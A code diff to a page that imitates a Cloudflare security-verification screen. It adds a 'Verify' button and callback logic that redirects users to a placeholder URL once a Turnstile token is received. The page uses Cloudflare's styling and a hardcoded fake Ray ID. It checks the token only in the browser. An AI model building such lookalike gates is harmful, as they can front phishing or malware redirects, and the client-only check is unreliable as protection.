@@ -92,7 +92,7 @@
   
   .turnstile-container {
     display: none;
-    justify-content: flex-start;
+    justify-content: center;
     margin: 2rem 0;
     min-height: 65px;
   }
@@ -109,7 +109,7 @@
   
   .cf-turnstile {
     display: flex !important;
-    justify-content: flex-start !important;
+    justify-content: center !important;
     align-items: center !important;
     min-height: 65px !important;
     width: auto !important;
@@ -122,13 +122,40 @@
   
   .cf-turnstile .cf-turnstile-wrapper {
     display: flex !important;
-    justify-content: flex-start !important;
+    justify-content: center !important;
     align-items: center !important;
+  }
+  
+  .verify-button {
+    display: none;
+    margin: 1rem auto;
+    padding: 12px 24px;
+    background-color: #f38020;
+    color: #000000;
+    border: none;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+  
+  .verify-button:hover {
+    background-color: #e07010;
+  }
+  
+  .verify-button:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+  
+  .verify-button.visible {
+    display: block;
   }
   
   .spinner-container {
     display: flex;
-    justify-content: flex-start;
+    justify-content: center;
     margin: 2rem 0;
     height: 76.391px;
     align-items: center;
@@ -319,17 +346,6 @@
     color: #fc574a;
     border: 1px solid #fc574a;
   }
-  
-  .click-instruction {
-    display: none;
-    font-size: 13px;
-    color: #b6b6b6;
-    margin-top: 8px;
-  }
-  
-  .click-instruction.visible {
-    display: block;
-  }
 </style>
 </head>
 <body>
@@ -342,13 +358,13 @@
     </div>
 
     <!-- Title -->
-    <h2 id="statusTitle">Performing security verification</h2>
+    <h2 id="statusTitle">Complete verification</h2>
     
     <!-- Description -->
-    <p id="statusSub" class="verification-text">This website uses a security service to protect against malicious bots. This page is displayed while the website verifies you are not a bot.</p>
+    <p id="statusSub" class="verification-text">Please complete the verification below and click the button to confirm you are not a bot.</p>
 
     <!-- Spinner (visible initially) -->
-    <div class="spinner-container" id="spinnerContainer">
+    <div class="spinner-container hidden" id="spinnerContainer">
       <div class="spinner" id="spinner">
         <div></div>
         <div></div>
@@ -360,8 +376,8 @@
     <!-- Turnstile Container (hidden initially) -->
     <div class="turnstile-container" id="turnstileContainer"></div>
     
-    <!-- Click instruction (hidden initially) -->
-    <p class="click-instruction" id="clickInstruction">Please click the "Verify you are human" button above to continue.</p>
+    <!-- Verify Button -->
+    <button class="verify-button" id="verifyButton">Verify</button>
     
     <!-- Success Check -->
     <div class="success-check" id="successCheck">✅</div>
@@ -408,6 +424,7 @@
 
   var redirectTarget = REDIRECT_URL;
   var isVerified = false;
+  var turnstileToken = null;
 
   document.getElementById('siteName').textContent = window.location.hostname;
   document.getElementById('rayId').textContent = 'a16288a3796d32c0';
@@ -424,6 +441,7 @@
     document.getElementById('statusSub').textContent = message || 'Please refresh the page to try again.';
     document.getElementById('error-note').style.display = 'block';
     showStatus('❌ ' + (message || 'Verification failed'), 'fail');
+    document.getElementById('verifyButton').disabled = true;
   }
 
   function startCountdown(seconds) {
@@ -455,15 +473,10 @@
     
     console.log('✅ Verification successful! Redirecting...');
     
-    // Hide spinner
-    document.getElementById('spinnerContainer').classList.add('hidden');
-    
-    // Hide Turnstile
+    // Hide Turnstile and button
     document.getElementById('turnstileContainer').classList.remove('visible');
     document.getElementById('turnstileContainer').style.display = 'none';
-    
-    // Hide click instruction
-    document.getElementById('clickInstruction').classList.remove('visible');
+    document.getElementById('verifyButton').classList.remove('visible');
     
     // Show success checkmark
     document.getElementById('successCheck').style.display = 'block';
@@ -481,25 +494,38 @@
     startCountdown(2);
   }
 
-  // ====== TURNSTILE CALLBACK - THIS IS CALLED WHEN USER CLICKS ======
-  window.turnstileCallback = function(token) {
-    console.log('🔑 Turnstile token received from user click:', token);
+  // ====== TURNSTILE CALLBACKS ======
+  window.onTurnstileVerified = function (token) {
+    console.log('🔑 Turnstile token received:', token);
     
-    if (token && token.length > 0 && !isVerified) {
-      // User clicked and verified successfully
-      onSuccess();
-    } else if (!isVerified) {
-      showError('Invalid token received.');
-      if (window.turnstile) window.turnstile.reset();
+    if (token && token.length > 0) {
+      turnstileToken = token;
+      document.getElementById('verifyButton').disabled = false;
+      document.getElementById('verifyButton').textContent = '✓ Verify';
+      showStatus('✅ Verification completed! Click the button to proceed.', 'success');
+    } else {
+      turnstileToken = null;
+      document.getElementById('verifyButton').disabled = true;
+      document.getElementById('verifyButton').textContent = 'Verify';
+      showStatus('❌ Invalid token received. Please try again.', 'fail');
     }
   };
 
-  window.turnstileErrorCallback = function() {
+  window.onTurnstileError = function () {
     console.log('❌ Turnstile error');
     if (!isVerified) {
       showError('Could not load the challenge widget.');
     }
   };
+
+  // ====== VERIFY BUTTON HANDLER ======
+  document.getElementById('verifyButton').addEventListener('click', function() {
+    if (turnstileToken && !isVerified) {
+      onSuccess();
+    } else if (!turnstileToken) {
+      showStatus('⚠️ Please complete the verification challenge first.', 'fail');
+    }
+  });
 
   // Render Turnstile
   window.addEventListener('load', function () {
@@ -511,14 +537,12 @@
         clearInterval(interval);
         console.log('🎯 Rendering Turnstile with key:', SITE_KEY);
         
-        // Show spinner
         document.getElementById('spinnerContainer').classList.remove('hidden');
         
-        // Render Turnstile with explicit callback
         window.turnstile.render('#turnstileContainer', {
           sitekey: SITE_KEY,
-          callback: window.turnstileCallback,
-          'error-callback': window.turnstileErrorCallback,
+          callback: 'onTurnstileVerified',
+          'error-callback': 'onTurnstileError',
           theme: 'dark',
           size: 'normal'
         });
@@ -528,11 +552,8 @@
           document.getElementById('spinnerContainer').classList.add('hidden');
           document.getElementById('turnstileContainer').classList.add('visible');
           document.getElementById('turnstileContainer').style.display = 'flex';
-          
-          // Show click instruction
-          document.getElementById('clickInstruction').classList.add('visible');
-          
-          console.log('✅ Turnstile rendered and visible - waiting for user click');
+          document.getElementById('verifyButton').classList.add('visible');
+          console.log('✅ Turnstile rendered and visible');
         }, 1000);
         
       } else if (tries > 40) {
@@ -551,8 +572,8 @@
     
     window.turnstile.render('#turnstileContainer', {
       sitekey: SITE_KEY,
-      callback: window.turnstileCallback,
-      'error-callback': window.turnstileErrorCallback,
+      callback: 'onTurnstileVerified',
+      'error-callback': 'onTurnstileError',
       theme: 'dark',
       size: 'normal'
     });
@@ -561,10 +582,8 @@
       document.getElementById('spinnerContainer').classList.add('hidden');
       document.getElementById('turnstileContainer').classList.add('visible');
       document.getElementById('turnstileContainer').style.display = 'flex';
-      
-      document.getElementById('clickInstruction').classList.add('visible');
-      
-      console.log('✅ Turnstile rendered and visible - waiting for user click');
+      document.getElementById('verifyButton').classList.add('visible');
+      console.log('✅ Turnstile rendered and visible');
     }, 1000);
   }
 })();
